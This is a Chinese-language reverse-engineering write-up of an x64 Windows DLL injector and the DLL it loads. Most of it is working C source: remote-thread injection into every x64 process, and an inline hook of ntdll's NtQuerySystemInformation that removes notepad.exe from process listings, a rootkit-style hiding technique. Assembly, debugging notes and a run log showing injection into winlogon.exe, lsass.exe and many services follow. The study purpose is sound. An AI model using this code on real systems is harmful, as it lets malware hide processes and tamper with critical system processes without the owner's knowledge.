# 局部Hook x64注入器分析

[mycode/Re/API_HOOK/notepad_进程隐藏/非全局钩子 at 0f5b6fc83c5b4e118f8589e474fcc3df3f27a26b · redqx/mycode](https://github.com/redqx/mycode/tree/0f5b6fc83c5b4e118f8589e474fcc3df3f27a26b/Re/API_HOOK/notepad_进程隐藏/非全局钩子)

x64版本

```c
__int64 ntdll_NtQuerySystemInformation()
{
  __int64 result; // rax

  result = 54i64;
  __asm { syscall; Low latency system call }
  return result;
}
```

![Untitled](%E5%B1%80%E9%83%A8Hook%20x64%E6%B3%A8%E5%85%A5%E5%99%A8%E5%88%86%E6%9E%90%202768b58d40024926a7027fa09bb0089e/Untitled.png)

另外逆向工程核心原理用的是ZwQuerySystemInformation()

可它是是内核的API,不可以LoadLibray或者getModuleHandle

所以我们得用的NtQuerySystemInformation()

# x64注入器分析

其实用的只不过是一个远程线程的Dll注入

但是做了一些改进

比如

1), 不仅仅是远程LoadLibary那么简单, 他增加了FreeLibary

2), 可以对所有进程注入(虽然实现并不难)

3), 还对dll做了一些操作(后续互明白)

# main

```c
int main(int argc, CHAR* argv[])
{
    testAll();
    //test_Single();
    return;
}
```

就2种模式

一个是针对某个进程的注入

一个是对当前开启的所有进程注入

其实大概原理都是一样的,但是只对x64进程hook

## testAll

```c
int testAll()
{
    int nMode = INJECTION_MODE;
    HMODULE hLib = NULL;
    type_Set_TagetProcess Set_TagetProcess = NULL;
    CHAR* szmode;
    CHAR* dllPath;
    WCHAR* processName;

 
    szmode = "-hide";
    //szmode = L"-show";
    dllPath = "c:\\redqx64.dll";
    processName = L"notepad.exe";
    
    //  常规提权
    if (SetPrivilege(SE_DEBUG_NAME, TRUE))
    {
        // load library
        hLib = LoadLibraryA(dllPath);//自己去加载那个dll,同时自己也被hook了
        if (hLib)
        {
            // set process name to hide
            Set_TagetProcess = (type_Set_TagetProcess)GetProcAddress(hLib, "Set_TagetProcess");//获取dllname
            if (Set_TagetProcess)
            {
                Set_TagetProcess(processName);//会把数据复制到dll里的某个全局变量中

                // Inject(Eject) Dll to all process
                if (!strcmp(szmode, "-show"))
                {
                    nMode = EJECTION_MODE;
                }

                //往所有进程注入.. 
                //有个问题: x64的dll只能往x64注入
                //算了吧 所有进程注入,系统就蓝屏了
                InjectAllProcess(nMode, dllPath);
            }
            FreeLibrary(hLib);
        }
    }
    return 0;
}
```

可以看到很简单

就是加载dll,然后自己往dll写入目标进程的名字

然后判断当前模式

然后调用 InjectAllProcess(nMode, dllPath); 注入dll

## InjectAllProcess

```c
BOOL InjectAllProcess(int nMode, CHAR* szDllPath)
{
	DWORD                   dwPID = 0;
	HANDLE                  hSnapShot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32          pe;

	// Get the snapshot of the system
	pe.dwSize = sizeof( PROCESSENTRY32 );

    //TMD  CreateToolhelp32Snapshot会间接调用 NtQuerySystemInformation 同时
	hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, 0 );
	
    // 遍历所有进程
	Process32First(hSnapShot, &pe);
    printf("|---BEGIN---|\n");
	do
	{
		dwPID = pe.th32ProcessID;
        printf("%d:%s", dwPID, pe.szExeFile);
 
        //对PID<100的进程不注入 (考虑到安全性)
        if (dwPID < 100)
        {
            printf(" dangerous process");
            goto  label_OpenProcessfailed;
        }
        //dwPID = FindProcessID(L"procexp64.exe");
        if (!(hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPID)))
        {
            printf(" OpenProcess  failed");
            goto  label_OpenProcessfailed;
        }
        IsWow64Process(hProcess, &is_x86);
        CloseHandle(hProcess);
        if (is_x86)
        {
            printf(" x86 process");
        }
        else
        {
            if (nMode == INJECTION_MODE)
            {
                if (InjectDll_hook(dwPID, szDllPath))
                {
                    printf(" sth success");
                }
                else
                {
                    printf(" sth failed");
                }
            }
            else
            {
                if (EjectDll_unhook(dwPID, szDllPath))
                {
                    printf(" sth success");
                }
                else
                {
                    printf(" sth failed");
                }
            }
        }
 label_OpenProcessfailed:
        printf("\n");     
	}
	while( Process32Next(hSnapShot, &pe) );
    printf("|----END----|\n");

	CloseHandle(hSnapShot);
	return TRUE;
}
```

归根结底来说,还是很简单

其实就是就是遍历所有进程

然后对单个进程选择注入还是不注入

## 注入

```c
/*
* 函数名: InjectDll_hook
* 函数参数:
*   参数1: 目标进程的PID
*   参数2: 要注入的dll路径
* 函数功能:
    线程创建线程加载我们的dll
*/
BOOL InjectDll_hook(DWORD dwPID, CHAR*szDllPath)
{
	HANDLE hProcess, hRemoteThread;
	LPVOID pRemoteBuf;
    DWORD dwBufSize = strlen(szDllPath) + 1;
	LPTHREAD_START_ROUTINE  pThreadProc;
    DWORD64 exitCode = 0;
	if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )
    {
        printf("OpenProcess failed");
		return FALSE;
    }

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteBuf)
    {
        WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);

        pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);

        //WaitForSingleObject(hRemoteThread, INFINITE);
        WaitForSingleObject(hRemoteThread, 3000);//有些可能报错,一直不返回?
        GetExitCodeThread(hRemoteThread, &exitCode);
        //wprintf(L" %p ", exitCode);
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hRemoteThread);
    }
	CloseHandle(hProcess);
    if (exitCode)
        return TRUE;
    else
	    return FALSE;
}
```

其实也很简单,就是注册远程线程,去加载我们的dll

其中,我们用的个`WaitForSingleObject(hRemoteThread, 3000);//有些可能报错,一直不返回?`

因为有些线程会失败,不能一直等待

## 卸载dll

```c
BOOL EjectDll_unhook(DWORD dwPID, CHAR* szDllPath)
{
	BOOL bMore = FALSE, bFound = FALSE;
	HANDLE hSnapshot, hProcess, hRemoteThread;
	MODULEENTRY32 me = { sizeof(me) };
	LPTHREAD_START_ROUTINE  pThreadProc;
    DWORD64 exitCode = 0;
    //拍快照?
    if (INVALID_HANDLE_VALUE == (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)))
    {
        return FALSE;
    }

    //寻找目标进程的dll是否加载,加载了就卸载
	bMore = Module32First(hSnapshot, &me);
	for( ; bMore ; bMore = Module32Next(hSnapshot, &me) )
	{
		if( !strcmp(me.szModule, szDllPath) || !strcmp(me.szExePath, szDllPath) )
		{
			bFound = TRUE;
			break;
		}
	}

	if( !bFound )
	{
		CloseHandle(hSnapshot);
		return FALSE;
	}

	if( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )
	{
        printf("OpenProcess failed");
		CloseHandle(hSnapshot);
		return FALSE;
	}

	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "FreeLibrary");
    if (pThreadProc)
    {
        hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL);
        //WaitForSingleObject(hRemoteThread, INFINITE);
				WaitForSingleObject(hRemoteThread, 3000);
        GetExitCodeThread(hRemoteThread, &exitCode);
    }    
	CloseHandle(hRemoteThread);
	CloseHandle(hProcess);
	CloseHandle(hSnapshot);
    if (exitCode)
        return TRUE;
    else
        return FALSE;
}
```

和之前的原理是一样的,也就是创建现场FreeLibiary

不过他是找到目标进程,然后寻找进程自己的模块地址

然后去FreeLibiary

# Dll分析

dll干的事情就是

注入: 修改API入口,然后jmp到我们的函数

卸载: 修改API入口,还原以前的字节码

## DllMain

```c
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    //用于判断字节是否也需要被hook
    //WCHAR szCurProc[MAX_PATH] = { 0, };
    //WCHAR* p = NULL;
    //GetModuleFileNameW(NULL, szCurProc, sizeof(szCurProc));
    //p = wcsrchr(szCurProc, L'\\');

    //if ((p != NULL) && !_wcsicmp(p + 1, L"noname.exe")) //自己
    //{
    //    return TRUE;
    //}

    switch (fdwReason)
    {

    case DLL_PROCESS_ATTACH:
        hook_by_code(szNtdll, szNtQuerySystemInformatio);//
        break;
    case DLL_PROCESS_DETACH:
        unhook_by_code(szNtdll, szNtQuerySystemInformatio);
        break;
    }
    return TRUE;
}
```

其实就2种情况

加载的时候,做一个hook

卸载的时候,做一个unhook

## hook_by_code

```c
/*
* 函数名字: my_NtQuerySystemInformation
* 函数参数: 很多
* 函数功能: 删除notepad的那个节点
*/
BOOL hook_by_code(CHAR* szDllName, CHAR* szFuncName)
{
    FARPROC pfnOrg;
    BYTE* dwOldProtect;
    VOID* dwAddress;
    BYTE pBuf[16] = { 
        0x48,0xB8, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, //mov rax, xx
        0xFF,0xE0 //jmp rax
    };
    PBYTE pByte;
    
 
    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
    pByte = (PBYTE)pfnOrg;

    if (pByte[0] == 0x48)
    {
        return FALSE;
    }

    VirtualProtect((LPVOID)pfnOrg, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    memcpy(g_OldAPI, pfnOrg, 12);
    dwAddress = getReallCall(my_NtQuerySystemInformation);
    memcpy(&pBuf[2], &dwAddress , 8);
    memcpy(pfnOrg, pBuf, 12);

    VirtualProtect((LPVOID)pfnOrg, 12, dwOldProtect, &dwOldProtect);

    return TRUE;
}
```

其实就是往API入口出写入汇编

mov rax,目标地址

jmp rax

## unhook_by_code

```c
BOOL unhook_by_code(CHAR*szDllName, CHAR* szFuncName)
{
    FARPROC pFunc;
    DWORD dwOldProtect;
    PBYTE pByte;

    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
    pByte = (PBYTE)pFunc;

    if (pByte[0] != 0x48)//没被hook
        return FALSE;

    VirtualProtect((LPVOID)pFunc, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    memcpy(pFunc, g_OldAPI, 12);
    VirtualProtect((LPVOID)pFunc, 12, dwOldProtect, &dwOldProtect);

    return TRUE;
}
```

其实就是还原罢了

## my_NtQuerySystemInformation

```c
NTSTATUS WINAPI my_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS arg_SystemInformationClass,
    PVOID arg_SystemInformation,
    ULONG arg_SystemInformationLength,
    PULONG arg_ReturnLength
)
{
    NTSTATUS status;
    FARPROC pFunc;
    PSYSTEM_PROCESS_INFORMATION lp_LinkCur, lp_Link_Pre = 0;
    //脱钩,因为后面我们要调用真正的NtQuerySystemInformatio.. 否则无法正常调用

    unhook_by_code(szNtdll, szNtQuerySystemInformatio);

    pFunc = GetProcAddress(GetModuleHandleA(szNtdll), szNtQuerySystemInformatio);
    status = ((type_NtQuerySystemInformation)pFunc)(arg_SystemInformationClass, arg_SystemInformation, arg_SystemInformationLength, arg_ReturnLength);
    //先实际上调用一遍 原始的NtQuerySystemInformation

    if (status != 0)
    {
        goto __NTQUERYSYSTEMINFORMATION_END;//这个分支不太明白
    }
    //printf("%d %d\n", arg_SystemInformationClass, SystemProcessInformation);
    if (arg_SystemInformationClass == SystemProcessInformation)
    {

        lp_LinkCur = (PSYSTEM_PROCESS_INFORMATION)arg_SystemInformation;//为什么要自己去定义呢

        while (TRUE)
        {
            //删除链表中间节点的操作
            //头节点排外,而且我们也无法删除头节点
            if (lp_LinkCur->ImageName.Buffer!= NULL)
            {
                if (!_wcsicmp(lp_LinkCur->ImageName.Buffer, g_szTargetName))//只能是W版本
                {
                    if (lp_LinkCur->NextEntryOffset == 0)
                    {
                        if (lp_Link_Pre)
                        {
                            lp_Link_Pre->NextEntryOffset = 0;
                        }
                    }
                    else
                    {
                        if (lp_Link_Pre)
                        {
                            lp_Link_Pre->NextEntryOffset += lp_LinkCur->NextEntryOffset;

                        }                
                    }
                }
                else
                {
                    lp_Link_Pre = lp_LinkCur;
                    //上一个=当前
                }
            }
            if (lp_LinkCur->NextEntryOffset == 0)
            {
                break;
            }
            lp_LinkCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)lp_LinkCur + lp_LinkCur->NextEntryOffset);
        }
    }

__NTQUERYSYSTEMINFORMATION_END:

    //对NtQuerySystemInformatio挂钩
    hook_by_code(szNtdll, szNtQuerySystemInformatio);

    return status;
}
```

其实就是删除notepad的节点

# 调试遇到的问题

## CreateToolhelp32Snapshot 异常

究其原因是注入在自己被hook后, 

CreateToolhelp32Snapshot 内部会调用NtQuerySystemInformation

同时NtQuerySystemInformationy又被hook了

hook后,也没啥关系嘛,反正hook后的东西也就是删除一个notepad的进程节点

注入器也没有去管notepad进程节点

![Untitled](%E5%B1%80%E9%83%A8Hook%20x64%E6%B3%A8%E5%85%A5%E5%99%A8%E5%88%86%E6%9E%90%202768b58d40024926a7027fa09bb0089e/Untitled%201.png)

但是就是想不通..为什么自己被hook后会被报错

后来发现是寄存器的一些限制

比如

来一种情况也比较好,也就是可以代表是负数

起点是 0x00007FFCB4F0D763

终点是 0x00007FFC7A981B85

jmp的值是什么? 0x00007FFC7A981B85-0x00007FFCB4F0D763=0xFFFFFFFFC5A74422

可以看出应该往后跳转

但是…我们的jmp只需要4字节,所以在源代码中做了一个截取0xFFFFFFFFC5A74422⇒0xC5A74422

这就jmp 0xC5A74422

一起0xC5A74422>0x7fffffff

所以可以看出是往后跳转

糟糕的是

起点是 00007FFCB4F0D765

终点是 00007FFC20D61B80

jmp的值是什么? 0x00007FFC20D61B80-0x0007FFCB4F0D765=FFFFFFFF6BE5441B

可以看出应该往后跳转

但是…我们的jmp只需要4字节,所以在源代码中做了一个截取FFFFFFFF6BE5441B⇒6BE5441B

0x6BE5441B<0x7fffffff

这就jmp 0x6BE5441B

于是就变为了往往前跳转了,是不是很离谱

那如何解决?

NtQuerySystemInformation位于ntdll, ntdll一般都在高位

自己的dll一般都在低位

我们hook的时候, 用的是低位地址(目的)-高位地址(源), 结果当然是负数

如果负数一般小,比如0xFFFFFFFFFFFF1234,转化为4字节也才0xFFFF1234,仍然保留了负数的特性

如果负数很大,比如0xFFFFFFFF56781234,转化为4字节后0x56781234,却丢失了负数的特性

好像,没办法解决,只能祈祷ntdll和自己的dll之间的地址相差近一点

也就是远近都在方圆0x7fffffff以内

可以有3种选择方案

1), 用 jmp rax

2), 用 jmp qword ptr [lpfunc]

3), 算了把,直接修改ntdll的IAT表,然后替换为自己的函数

如果用的是 jmp rax 的话

形式1

```nasm
.text:00007FF7BB5E1790 48 8D 05 69 A8 00 00          lea     rax, off_7FF7BB5EC000
.text:00007FF7BB5E1797 48 8B 00                      mov     rax, [rax]
.text:00007FF7BB5E179A FF E0                         jmp     rax
```

或者 形式2

```nasm
.text:0000000140011790 48 8B 05 69 A8 00 00          mov     rax, cs:off_14001C000
.text:0000000140011797 FF E0                         jmp     rax
```

其中我们是访问了一个dll的全局变量

全局变量里面有我们要去的地方

形式1用到了12字节,性质2用到了9字节

dll全局变量的访问是通过相对偏移的方式寻址,所以不需要重定位

如果用的是 jmp qword ptr 的话

```nasm
.text:00007FF7462D1790                               sub_7FF7462D1790 proc near    ; CODE XREF: sub_7FF7462D12CB↑j
.text:00007FF7462D1790 FF 25 6A A8 00 00             jmp     cs:off_7FF7462DC000
.text:00007FF7462D1790
.text:00007FF7462D1790                               sub_7FF7462D1790 end
```

用了6字节,用的是dll的全局变量

全局变量的寻址也是通过相对偏移

但是

![Untitled](%E5%B1%80%E9%83%A8Hook%20x64%E6%B3%A8%E5%85%A5%E5%99%A8%E5%88%86%E6%9E%90%202768b58d40024926a7027fa09bb0089e/Untitled%202.png)

你的jmp rax 和 jmp qword ptr 代码还是在ntdll里面

![Untitled](%E5%B1%80%E9%83%A8Hook%20x64%E6%B3%A8%E5%85%A5%E5%99%A8%E5%88%86%E6%9E%90%202768b58d40024926a7027fa09bb0089e/Untitled%203.png)

虽然访问的是dll的全局变量

但是我们是在ntll里面访问我们自己加载dll的全局变量

所以还是涉及一个相对距离的计算

ntdll距离你的代码还是可能很远

所以 … 只有修改IAT表了

关于修改IAT表遇到的问题

IAT表没有ntdll和NtQuerySystemInformation

但在运行过程中却调用了

tips:

exe调用CreateToolhelp32Snapshot,
CreateToolhelp32Snapshot位于kernel32中
exe的导入表也记录了CreateToolhelp32Snapshot和kernel32
可是导入表里面没有ntdll, CreateToolhelp32Snapshot最后会调用ntdll的NtQuerySystemInformation
请问他是如何知道NtQuerySystemInformation的函数地址的

先不说这个问题如何解决,后面再解决

这写遇到的很多问题,都是基于相对偏移的寻址只能有0x7fffffff的范围

是寻址,不是跳转, 因为我们之前通过全局变量寻址也失败了

后来发现可以把地址写死的

然后再去往某个地址

![Untitled](%E5%B1%80%E9%83%A8Hook%20x64%E6%B3%A8%E5%85%A5%E5%99%A8%E5%88%86%E6%9E%90%202768b58d40024926a7027fa09bb0089e/Untitled%204.png)

这样的话,就可以去往任何地方了

于是后面又再次遇到问题

我们把rax参数给抢占了,也就是说

别人的rax是有用处的,你把rax的值修改后.函数就会调用失败的

但这针对当前项目,rax确实别无用处,所以可以使用的

## VirtualAllocEx 有问题

也就是对于一些敏感进程

比如下面这些进程,VirtualAllocEx会成功返回地址

但是去目标进程看呢,那个地址并不存在 

WriteProcessMemory也不知道把数据写到哪里去了

目标进程在执行远程线程的时候

LoadLibiary是有的

dllName的地址也是有的,就是VirtualAllocEx的

但是dllName指向的地方是是错误的

这就导致目标进程执行远程线程会失败,失败后也不知道为什么就崩溃了

```c
C:\Users\virus\Desktop>C.exe
|---BEGIN---|
0:[System Process] dangerous process
4:System dangerous process
92:Registry dangerous process
316:smss.exe OpenProcess  failed
416:csrss.exe OpenProcess  failed
492:wininit.exe OpenProcess  failed
508:csrss.exe OpenProcess  failed
588:winlogon.exe sth success
628:services.exe OpenProcess  failed
652:lsass.exe sth success
776:svchost.exe sth success
784:fontdrvhost.exe sth failed
788:fontdrvhost.exe sth failed
896:svchost.exe sth success
984:dwm.exe sth success
732:svchost.exe sth success
624:svchost.exe sth success
844:svchost.exe sth success
912:svchost.exe sth success
1128:svchost.exe sth success
1196:svchost.exe sth success
1324:svchost.exe sth success
1476:Memory Compression OpenProcess  failed
1572:svchost.exe sth success
1616:svchost.exe sth success
1632:svchost.exe sth success
1812:spoolsv.exe sth success
1848:svchost.exe sth success
1868:svchost.exe sth success
1420:svchost.exe sth success
2148:svchost.exe sth failed
2232:VGAuthService.exe sth failed
2240:vm3dservice.exe sth success
2252:vmtoolsd.exe sth failed
2264:MsMpEng.exe OpenProcess  failed
2328:svchost.exe x86 process
2500:vm3dservice.exe sth success
2744:dllhost.exe sth success
2880:svchost.exe OpenProcess  failed
408:WmiPrvSE.exe sth success
2184:msdtc.exe sth success
3448:NisSrv.exe OpenProcess  failed
3580:WmiPrvSE.exe sth success
3632:svchost.exe sth success
3352:sihost.exe sth success
3344:svchost.exe sth success
3556:taskhostw.exe sth success
3976:ctfmon.exe sth success
1516:explorer.exe sth success
3316:ChsIME.exe sth success
3824:svchost.exe sth success
4292:StartMenuExperienceHost.exe sth failed
4360:RuntimeBroker.exe sth success
4452:SearchApp.exe sth success
4704:RuntimeBroker.exe sth success
4732:SearchIndexer.exe sth failed
5116:TextInputHost.exe sth failed
2944:svchost.exe OpenProcess  failed
1244:RuntimeBroker.exe sth success
5332:SgrmBroker.exe OpenProcess  failed
5504:svchost.exe sth success
5592:svchost.exe OpenProcess  failed
5916:smartscreen.exe sth success
5956:SecurityHealthSystray.exe sth success
5996:SecurityHealthService.exe OpenProcess  failed
6072:vmtoolsd.exe sth failed
5152:msedge.exe sth success
5148:msedge.exe sth success
2412:msedge.exe sth failed
2484:msedge.exe sth success
384:msedge.exe sth failed
6584:PhoneExperienceHost.exe sth failed
6880:RuntimeBroker.exe sth success
6988:WmiApSrv.exe sth success
3840:SystemSettings.exe sth success
3620:ApplicationFrameHost.exe sth success
3544:UserOOBEBroker.exe sth success
6064:backgroundTaskHost.exe sth success
2988:backgroundTaskHost.exe sth success
4840:backgroundTaskHost.exe sth success
6220:RuntimeBroker.exe OpenProcess  failed
6476:dllhost.exe sth failed
4256:ChsIME.exe sth success
772:audiodg.exe sth success
5656:RuntimeBroker.exe sth success
4880:RuntimeBroker.exe sth success
5308:WindowsTerminal.exe sth failed
3144:dllhost.exe sth success
3576:RuntimeBroker.exe sth success
2556:OpenConsole.exe sth failed
2552:cmd.exe sth success
7060:C.exe sth success
|----END----|
```